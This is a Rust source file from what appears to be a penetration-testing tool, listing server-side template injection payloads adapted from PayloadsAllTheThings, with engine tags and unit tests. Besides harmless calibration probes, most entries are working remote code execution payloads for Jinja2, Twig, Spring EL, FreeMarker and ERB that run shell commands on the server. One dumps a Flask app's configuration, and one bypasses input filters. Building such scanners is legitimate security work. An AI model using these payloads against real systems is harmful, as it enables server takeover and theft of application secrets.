//! Server-side template injection seed payloads.
//!
//! Curated from PayloadsAllTheThings / SSTI (MIT). Each payload is
//! tagged with the template engine it targets so the primitive crate
//! can pick the right set after fingerprinting with a calibration
//! probe (e.g. `{{7*7}}` reflecting `49` vs `{{7*'7'}}` reflecting
//! `7777777`).

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Ssti;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "{{7*7}}",
        notes: "calibration probe — Jinja2/Twig/Liquid render `49`",
        tags: &["jinja2", "twig", "liquid", "probe"],
    },
    Payload {
        category: C,
        value: "{{7*'7'}}",
        notes: "engine differentiator — Jinja2 renders `7777777`, Twig renders `49`",
        tags: &["jinja2", "twig", "probe"],
    },
    Payload {
        category: C,
        value: "${7*7}",
        notes: "FreeMarker / Spring EL calibration",
        tags: &["freemarker", "spring", "probe"],
    },
    Payload {
        category: C,
        value: "<%= 7*7 %>",
        notes: "ERB / EJS calibration",
        tags: &["erb", "ejs", "probe"],
    },
    Payload {
        category: C,
        value: "#{7*7}",
        notes: "Ruby/Pug calibration — renders `49` if interpolated",
        tags: &["ruby", "pug", "probe"],
    },
    Payload {
        category: C,
        value: "{{config.items()}}",
        notes: "Jinja2/Flask — dumps the app's `config` mapping",
        tags: &["jinja2", "flask", "exfil"],
    },
    Payload {
        category: C,
        value: "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        notes: "Jinja2 — walk MRO to reach Popen subclass for RCE",
        tags: &["jinja2", "rce"],
    },
    Payload {
        category: C,
        value:
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        notes: "Jinja2 RCE via request.application — works in modern Flask",
        tags: &["jinja2", "flask", "rce"],
    },
    Payload {
        category: C,
        value:
            "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
        notes: "Twig RCE — registerUndefinedFilterCallback gadget",
        tags: &["twig", "rce"],
    },
    Payload {
        category: C,
        value: "${T(java.lang.Runtime).getRuntime().exec('id')}",
        notes: "Spring EL — direct Runtime.exec",
        tags: &["spring", "rce"],
    },
    Payload {
        category: C,
        value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        notes: "FreeMarker RCE — Execute utility",
        tags: &["freemarker", "rce"],
    },
    Payload {
        category: C,
        value: "<%= system('id') %>",
        notes: "ERB RCE — direct system() call",
        tags: &["erb", "rce"],
    },
    Payload {
        category: C,
        value: "{{ self }}",
        notes: "Jinja2 / Liquid — reflects template context name; quick existence check",
        tags: &["jinja2", "liquid", "probe"],
    },
    Payload {
        category: C,
        value: "{%print(7*7)%}",
        notes: "Jinja2 statement form — bypasses filters that match only `{{`",
        tags: &["jinja2", "filter-bypass"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_ssti() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Ssti);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_calibration_probes() {
        let probes: Vec<_> = PAYLOADS
            .iter()
            .filter(|p| p.tags.contains(&"probe"))
            .collect();
        assert!(probes.len() >= 4);
    }

    #[test]
    fn has_rce_payloads_for_multiple_engines() {
        let engines = ["jinja2", "twig", "spring", "freemarker", "erb"];
        for e in engines {
            assert!(
                PAYLOADS
                    .iter()
                    .any(|p| p.tags.contains(&"rce") && p.tags.contains(&e)),
                "no RCE payload for engine {}",
                e
            );
        }
    }
}
